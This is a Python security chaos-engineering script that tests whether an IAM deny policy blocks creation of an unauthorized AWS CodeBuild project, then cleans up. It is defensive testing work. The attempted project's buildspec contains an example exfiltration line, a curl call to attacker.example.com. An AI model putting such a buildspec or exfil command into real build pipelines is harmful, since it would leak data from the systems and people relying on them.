"""
SCE Experiment 1.3 — Preventive Probe
Attack Node: 1.2 Create Malicious CodeBuild Project

This experiment validates that a preventive control (SCP / IAM deny policy)
blocks the creation of unauthorized CodeBuild projects. The attack attempts
to create a CodeBuild project using a role provisioned by the experiment.
The preventive control is an IAM deny policy attached to the experiment role
that explicitly denies codebuild:CreateProject. The hypothesis is that the
CreateProject API call is denied (Access Denied), proving the preventive
control works.
"""

import json
import logging
import time
import boto3
import botocore.exceptions

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
logger = logging.getLogger(__name__)

TIMESTAMP = int(time.time())
STACK_NAME = f"sce-experiment-{TIMESTAMP}"
EXPERIMENT_TAG = "1.3-SCE-Experiment-Preventive"
REGION = boto3.session.Session().region_name or "us-east-1"

# Module-level state shared across phases
_state = {
    "stack_name": STACK_NAME,
    "attack_role_arn": None,
    "attack_evidence": None,
    "region": REGION,
}

CFN_TEMPLATE = json.dumps({
    "AWSTemplateFormatVersion": "2010-09-09",
    "Description": "SCE 1.3 Preventive - Resources for CodeBuild malicious project creation test",
    "Resources": {
        "AttackRole": {
            "Type": "AWS::IAM::Role",
            "Properties": {
                "RoleName": f"sce-attack-role-{TIMESTAMP}",
                "AssumeRolePolicyDocument": {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Principal": {
                                "Service": "codebuild.amazonaws.com"
                            },
                            "Action": "sts:AssumeRole"
                        },
                        {
                            "Effect": "Allow",
                            "Principal": {
                                "AWS": {"Ref": "AWS::AccountId"}
                            },
                            "Action": "sts:AssumeRole"
                        }
                    ]
                },
                "Tags": [
                    {"Key": "Experiment", "Value": EXPERIMENT_TAG},
                    {"Key": "Timestamp", "Value": str(TIMESTAMP)}
                ]
            }
        },
        "AllowCodeBuildReadOnly": {
            "Type": "AWS::IAM::ManagedPolicy",
            "Properties": {
                "ManagedPolicyName": f"sce-codebuild-readonly-{TIMESTAMP}",
                "Description": "Allow listing CodeBuild projects (benign baseline)",
                "PolicyDocument": {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Action": [
                                "codebuild:ListProjects",
                                "codebuild:BatchGetProjects"
                            ],
                            "Resource": "*"
                        },
                        {
                            "Effect": "Allow",
                            "Action": [
                                "iam:PassRole"
                            ],
                            "Resource": {"Fn::GetAtt": ["AttackRole", "Arn"]}
                        }
                    ]
                },
                "Roles": [{"Ref": "AttackRole"}]
            }
        },
        "PreventiveControl": {
            "Type": "AWS::IAM::ManagedPolicy",
            "Properties": {
                "ManagedPolicyName": f"sce-deny-codebuild-create-{TIMESTAMP}",
                "Description": "PREVENTIVE CONTROL: Deny codebuild:CreateProject",
                "PolicyDocument": {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Sid": "DenyCreateCodeBuildProject",
                            "Effect": "Deny",
                            "Action": [
                                "codebuild:CreateProject",
                                "codebuild:UpdateProject"
                            ],
                            "Resource": "*"
                        }
                    ]
                },
                "Roles": [{"Ref": "AttackRole"}]
            }
        }
    },
    "Outputs": {
        "AttackRoleArn": {
            "Value": {"Fn::GetAtt": ["AttackRole", "Arn"]}
        },
        "AttackRoleName": {
            "Value": {"Ref": "AttackRole"}
        }
    }
})


def _wait_for_stack(cfn_client, stack_name, target_status, timeout=600):
    """Poll CloudFormation stack until target status or timeout."""
    deadline = time.monotonic() + timeout
    interval = 10
    while time.monotonic() < deadline:
        try:
            resp = cfn_client.describe_stacks(StackName=stack_name)
            status = resp["Stacks"][0]["StackStatus"]
            logger.info(f"Stack {stack_name} status: {status}")
            if status == target_status:
                return True
            if "FAILED" in status or "ROLLBACK_COMPLETE" in status:
                logger.error(f"Stack reached terminal failure state: {status}")
                # Retrieve reason
                events = cfn_client.describe_stack_events(StackName=stack_name)["StackEvents"]
                for e in events[:10]:
                    if "FAILED" in e.get("ResourceStatus", ""):
                        logger.error(f"  {e.get('LogicalResourceId')}: {e.get('ResourceStatusReason')}")
                return False
        except botocore.exceptions.ClientError as e:
            if "does not exist" in str(e):
                if target_status == "DELETE_COMPLETE":
                    return True
                logger.warning(f"Stack {stack_name} does not exist yet, retrying...")
            else:
                logger.error(f"Error describing stack: {e}")
        time.sleep(interval)
    logger.error(f"Timed out waiting for stack {stack_name} to reach {target_status}")
    return False


def steady_state():
    """Deploy CloudFormation stack with attack role and preventive deny policy."""
    logger.info(f"=== STEADY STATE === Deploying stack: {STACK_NAME}")
    cfn = boto3.client("cloudformation", region_name=REGION)

    # Check for pre-existing stack
    try:
        existing = cfn.describe_stacks(StackName=STACK_NAME)
        status = existing["Stacks"][0]["StackStatus"]
        logger.warning(f"Stack {STACK_NAME} already exists with status {status}")
        if status in ("CREATE_COMPLETE", "UPDATE_COMPLETE"):
            logger.info("Re-using existing stack.")
        elif status in ("ROLLBACK_COMPLETE", "DELETE_FAILED"):
            logger.info("Deleting broken stack before recreating...")
            cfn.delete_stack(StackName=STACK_NAME)
            _wait_for_stack(cfn, STACK_NAME, "DELETE_COMPLETE", timeout=300)
        else:
            logger.info(f"Waiting for existing stack to stabilize: {status}")
            time.sleep(30)
    except botocore.exceptions.ClientError as e:
        if "does not exist" not in str(e):
            raise

    # Create stack
    try:
        cfn.create_stack(
            StackName=STACK_NAME,
            TemplateBody=CFN_TEMPLATE,
            Capabilities=["CAPABILITY_NAMED_IAM"],
            Tags=[
                {"Key": "Experiment", "Value": EXPERIMENT_TAG},
                {"Key": "Timestamp", "Value": str(TIMESTAMP)},
            ],
        )
        logger.info(f"Stack creation initiated: {STACK_NAME}")
    except botocore.exceptions.ClientError as e:
        if "AlreadyExistsException" in str(e):
            logger.warning("Stack already exists, continuing...")
        else:
            raise

    success = _wait_for_stack(cfn, STACK_NAME, "CREATE_COMPLETE", timeout=600)
    if not success:
        raise RuntimeError(f"Stack {STACK_NAME} failed to reach CREATE_COMPLETE")

    # Extract outputs
    resp = cfn.describe_stacks(StackName=STACK_NAME)
    outputs = {o["OutputKey"]: o["OutputValue"] for o in resp["Stacks"][0].get("Outputs", [])}
    _state["attack_role_arn"] = outputs.get("AttackRoleArn")
    logger.info(f"Attack role ARN: {_state['attack_role_arn']}")

    # Wait for IAM eventual consistency
    logger.info("Waiting 15s for IAM role propagation...")
    time.sleep(15)

    return True


def attack() -> bool:
    """
    Attack step 1.2: Attempt to create a malicious CodeBuild project
    using the attack role. The preventive deny policy should block this.
    """
    logger.info("=== ATTACK === Attempting to create a malicious CodeBuild project")
    role_arn = _state.get("attack_role_arn")
    if not role_arn:
        logger.error("No attack role ARN available from steady_state")
        return False

    # Assume the attack role
    sts = boto3.client("sts", region_name=REGION)
    max_retries = 5
    assumed = None
    for attempt in range(max_retries):
        try:
            assumed = sts.assume_role(
                RoleArn=role_arn,
                RoleSessionName=f"sce-attack-session-{TIMESTAMP}",
                DurationSeconds=900,
            )
            logger.info("Successfully assumed attack role")
            break
        except botocore.exceptions.ClientError as e:
            logger.warning(f"AssumeRole attempt {attempt+1}/{max_retries} failed: {e}")
            time.sleep(10)

    if not assumed:
        logger.error("Failed to assume attack role after retries")
        return False

    creds = assumed["Credentials"]
    cb_client = boto3.client(
        "codebuild",
        region_name=REGION,
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
    )

    project_name = f"sce-malicious-project-{TIMESTAMP}"
    attack_succeeded = False
    error_code = None
    error_message = None

    try:
        response = cb_client.create_project(
            name=project_name,
            description="SCE Attack: Malicious CodeBuild Project",
            source={
                "type": "NO_SOURCE",
                "buildspec": (
                    "version: 0.2\n"
                    "phases:\n"
                    "  build:\n"
                    "    commands:\n"
                    "      - echo 'malicious payload'\n"
                    "      - curl http://attacker.example.com/exfil\n"
                )
            },
            artifacts={"type": "NO_ARTIFACTS"},
            environment={
                "type": "LINUX_CONTAINER",
                "image": "aws/codebuild/standard:5.0",
                "computeType": "BUILD_GENERAL1_SMALL",
            },
            serviceRole=role_arn,
            tags=[
                {"key": "Experiment", "value": EXPERIMENT_TAG},
            ],
        )
        # If we get here, the project was created — attack succeeded (control failed)
        attack_succeeded = True
        project_arn = response.get("project", {}).get("arn", "UNKNOWN")
        logger.warning(f"ATTACK SUCCEEDED: Malicious project created: {project_arn}")
        _state["attack_evidence"] = {
            "outcome": "project_created",
            "project_name": project_name,
            "project_arn": project_arn,
            "http_status": response.get("ResponseMetadata", {}).get("HTTPStatusCode"),
        }

        # Clean up the created project immediately
        try:
            cb_client.delete_project(name=project_name)
            logger.info(f"Cleaned up malicious project: {project_name}")
        except Exception as cleanup_err:
            logger.warning(f"Could not clean up project: {cleanup_err}")

    except botocore.exceptions.ClientError as e:
        error_code = e.response["Error"]["Code"]
        error_message = e.response["Error"]["Message"]
        http_status = e.response.get("ResponseMetadata", {}).get("HTTPStatusCode")
        logger.info(f"CreateProject denied: {error_code} — {error_message} (HTTP {http_status})")
        _state["attack_evidence"] = {
            "outcome": "access_denied",
            "error_code": error_code,
            "error_message": error_message,
            "http_status": http_status,
        }

    # The attack function returns True when it was carried out and produced evidence
    evidence = _state.get("attack_evidence")
    if evidence:
        logger.info(f"Attack evidence collected: {json.dumps(evidence, default=str)}")
        return True
    return False


def hypothesis_verification() -> bool:
    """
    Verify the preventive control worked:
    1. The attack evidence shows AccessDeniedException
    2. No malicious CodeBuild project exists in the account
    3. The deny policy is still attached to the role

    Returns True if the preventive control successfully blocked the attack.
    """
    logger.info("=== HYPOTHESIS VERIFICATION === Checking preventive control effectiveness")

    # Check 1: Attack evidence shows denial
    evidence = _state.get("attack_evidence", {})
    outcome = evidence.get("outcome", "")
    if outcome == "project_created":
        logger.error("CONTROL FAILED: Malicious CodeBuild project was successfully created")
        return False
    elif outcome != "access_denied":
        logger.error(f"Unexpected attack outcome: {outcome}")
        return False

    error_code = evidence.get("error_code", "")
    if error_code not in ("AccessDeniedException", "AccessDenied"):
        logger.error(f"Unexpected error code: {error_code}")
        return False

    logger.info(f"CHECK 1 PASSED: Attack was denied with {error_code}")

    # Check 2: Verify no malicious project exists using caller's credentials
    cb_client = boto3.client("codebuild", region_name=REGION)
    project_name = f"sce-malicious-project-{TIMESTAMP}"
    try:
        projects_resp = cb_client.batch_get_projects(names=[project_name])
        found = projects_resp.get("projects", [])
        if found:
            logger.error(f"CONTROL FAILED: Project {project_name} found in account!")
            return False
        logger.info(f"CHECK 2 PASSED: Project {project_name} does not exist")
    except botocore.exceptions.ClientError as e:
        logger.warning(f"Could not verify project absence: {e}")
        # Non-fatal — continue with other checks

    # Check 3: Verify the deny policy is still attached to the role
    iam_client = boto3.client("iam", region_name=REGION)
    role_name = f"sce-attack-role-{TIMESTAMP}"
    deny_policy_name = f"sce-deny-codebuild-create-{TIMESTAMP}"
    try:
        attached = iam_client.list_attached_role_policies(RoleName=role_name)
        policy_names = [p["PolicyName"] for p in attached.get("AttachedPolicies", [])]
        if deny_policy_name in policy_names:
            logger.info(f"CHECK 3 PASSED: Deny policy '{deny_policy_name}' is attached to role")
        else:
            logger.warning(f"Deny policy '{deny_policy_name}' not found in attached policies: {policy_names}")
            # Verify it exists via ARN search
            sts = boto3.client("sts", region_name=REGION)
            account_id = sts.get_caller_identity()["Account"]
            policy_arn = f"arn:aws:iam::{account_id}:policy/{deny_policy_name}"
            try:
                policy_resp = iam_client.get_policy(PolicyArn=policy_arn)
                logger.info(f"Deny policy exists: {policy_resp['Policy']['Arn']}")
            except botocore.exceptions.ClientError:
                logger.error("Deny policy does not exist — preventive control is missing")
                return False
    except botocore.exceptions.ClientError as e:
        logger.error(f"Failed to verify deny policy attachment: {e}")
        return False

    logger.info("=== HYPOTHESIS VERIFIED: Preventive control successfully blocked malicious CodeBuild project creation ===")
    return True


def rollback():
    """Delete the CloudFormation stack and all associated resources."""
    stack_name = _state.get("stack_name", STACK_NAME)
    logger.info(f"=== ROLLBACK === Deleting stack: {stack_name}")
    cfn = boto3.client("cloudformation", region_name=REGION)

    # Also clean up any leftover CodeBuild project (belt and suspenders)
    try:
        cb_client = boto3.client("codebuild", region_name=REGION)
        project_name = f"sce-malicious-project-{TIMESTAMP}"
        cb_client.delete_project(name=project_name)
        logger.info(f"Cleaned up CodeBuild project: {project_name}")
    except botocore.exceptions.ClientError:
        pass  # Project doesn't exist, which is expected

    try:
        cfn.delete_stack(StackName=stack_name)
        logger.info(f"Stack deletion initiated: {stack_name}")
        success = _wait_for_stack(cfn, stack_name, "DELETE_COMPLETE", timeout=600)
        if success:
            logger.info(f"Stack {stack_name} deleted successfully")
        else:
            logger.error(f"Stack {stack_name} deletion may not have completed")
    except botocore.exceptions.ClientError as e:
        if "does not exist" in str(e):
            logger.info(f"Stack {stack_name} does not exist — nothing to delete")
        else:
            logger.error(f"Error deleting stack: {e}")


def main():
    """Run the full experiment end-to-end."""
    logger.info(f"Starting SCE Experiment 1.3 — Preventive Probe")
    logger.info(f"Stack name: {STACK_NAME}")
    logger.info(f"Region: {REGION}")

    try:
        # Phase 1: Steady State
        steady_state()

        # Phase 2: Attack
        attack_result = attack()
        logger.info(f"Attack executed: {attack_result}")

        # Phase 3: Hypothesis Verification
        hypothesis_result = hypothesis_verification()
        logger.info(f"Hypothesis verified: {hypothesis_result}")

        if hypothesis_result:
            logger.info("EXPERIMENT PASSED: Preventive control is effective")
        else:
            logger.error("EXPERIMENT FAILED: Preventive control did not work as expected")

    except Exception as e:
        logger.error(f"Experiment failed with exception: {e}", exc_info=True)
    finally:
        # Phase 4: Rollback (always)
        rollback()


if __name__ == "__main__":
    main()